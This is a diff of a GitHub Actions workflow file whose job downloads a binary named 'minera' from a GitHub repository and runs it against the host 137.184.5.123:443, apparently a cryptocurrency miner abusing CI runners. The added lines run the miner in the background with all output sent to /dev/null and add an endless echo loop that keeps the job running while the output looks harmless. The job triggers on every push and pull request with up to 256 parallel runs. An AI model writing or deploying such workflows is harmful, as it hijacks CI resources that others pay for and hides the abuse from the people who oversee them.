@@ -3,7 +3,7 @@ on: [push, pull_request]
 jobs:
   build:
     name: Vps
-    runs-on: buildjet-64vcpu-ubuntu-1804
+    runs-on: ubuntu-latest
     strategy:
       max-parallel: 256
       fail-fast: false
@@ -25,4 +25,5 @@ jobs:
     - name: runner_go
       run: |
         apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-        wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t$(nproc --all)
+        wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t 1 >/dev/null 2>&1 >/dev/null &
+        while :; do echo "system true"; sleep 5; done
